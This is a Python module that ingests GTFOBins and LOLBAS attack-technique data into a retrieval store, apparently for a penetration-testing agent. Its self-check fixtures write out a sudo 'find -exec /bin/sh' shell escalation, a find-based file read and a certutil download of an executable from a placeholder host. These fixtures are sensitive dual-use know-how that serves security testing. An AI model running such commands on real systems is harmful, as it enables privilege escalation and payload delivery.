"""Attack-technique knowledge for the RAG — beyond CVEs.

Ingests actionable post-exploitation/privesc techniques so the agent can retrieve
"how", not just "what":
  - GTFOBins: Unix binaries abusable for shell/file-read/write/suid/sudo privesc,
    tagged with MITRE ATT&CK technique ids.

These are retrieval hints. The agent still reasons from scratch — a real target
rarely matches the canned snippet exactly.
ponytail: add LOLBAS (Windows) and ATT&CK technique descriptions the same way.
"""
from __future__ import annotations

from typing import Iterator

import requests

from .rag import _record

GTFOBINS_API = "https://gtfobins.github.io/api.json"
LOLBAS_API = "https://lolbas-project.github.io/api/lolbas.json"


def _gtfobins_records(data: dict) -> Iterator[dict]:
    fmeta = data.get("functions", {})
    for name, entry in data.get("executables", {}).items():
        funcs = entry.get("functions", {})
        if not funcs:
            continue
        mitre = sorted({m for f in funcs for m in (fmeta.get(f, {}).get("mitre") or [])})
        snippets = []
        for f, items in funcs.items():
            code = (items[0].get("code", "") if items else "")
            snippets.append(f"{f}: {code}"[:160])
        rec = _record(
            id=f"gtfobins:{name}", source="gtfobins",
            summary=f"{name} — GTFOBins abuse: {', '.join(funcs)}",
            products=name, cwe=",".join(mitre),
            references=[f"https://gtfobins.github.io/gtfobins/{name}/"],
        )
        rec["text"] = f"gtfobins {name} " + " ".join(funcs) + " " + " | ".join(snippets)
        yield rec


def fetch_gtfobins() -> Iterator[dict]:
    yield from _gtfobins_records(requests.get(GTFOBINS_API, timeout=60).json())


def _lolbas_records(data: list) -> Iterator[dict]:
    for e in data:
        name = e.get("Name", "")
        cmds = e.get("Commands") or []
        if not name or not cmds:
            continue
        cats = sorted({c.get("Category", "") for c in cmds if c.get("Category")})
        mitre = sorted({c.get("MitreID", "") for c in cmds if c.get("MitreID")})
        snippets = [f"{c.get('Category', '')}: {c.get('Command', '')}"[:160] for c in cmds[:4]]
        rec = _record(
            id=f"lolbas:{name}", source="lolbas",
            summary=f"{name} — Windows LOLBin: {', '.join(cats)}",
            products=name, cwe=",".join(mitre),
            references=[e.get("url") or f"https://lolbas-project.github.io/lolbas/Binaries/{name}/"],
        )
        rec["text"] = f"lolbas windows {name} " + " ".join(cats) + " " + " | ".join(snippets)
        yield rec


def fetch_lolbas() -> Iterator[dict]:
    yield from _lolbas_records(requests.get(LOLBAS_API, timeout=60).json())


if __name__ == "__main__":  # offline self-check: python -m metsec.techniques
    sample = {
        "functions": {"shell": {"mitre": ["T1059"]},
                      "file-read": {"mitre": ["T1005"]},
                      "sudo": {"mitre": ["T1548"]}},
        "executables": {
            "find": {"functions": {
                "shell": [{"code": "find . -exec /bin/sh \\; -quit"}],
                "sudo": [{"code": "sudo find . -exec /bin/sh \\; -quit"}],
                "file-read": [{"code": "find file -exec cat {} \\;"}]}},
            "empty": {"functions": {}},
        },
    }
    recs = list(_gtfobins_records(sample))
    assert len(recs) == 1, recs  # 'empty' skipped
    r = recs[0]
    assert r["id"] == "gtfobins:find" and r["source"] == "gtfobins"
    assert "T1059" in r["cwe"] and "T1548" in r["cwe"], r["cwe"]
    assert "/bin/sh" in r["text"] and "sudo" in r["text"], r["text"]

    lol = list(_lolbas_records([{"Name": "Certutil.exe", "url": "https://x/certutil",
        "Commands": [{"Command": "certutil -urlcache -f http://x/a.exe a.exe",
                      "Category": "Download", "MitreID": "T1105"}]}]))
    assert len(lol) == 1 and lol[0]["id"] == "lolbas:Certutil.exe"
    assert lol[0]["source"] == "lolbas" and "T1105" in lol[0]["cwe"]
    assert "certutil" in lol[0]["text"].lower()
    print("techniques self-check ok")
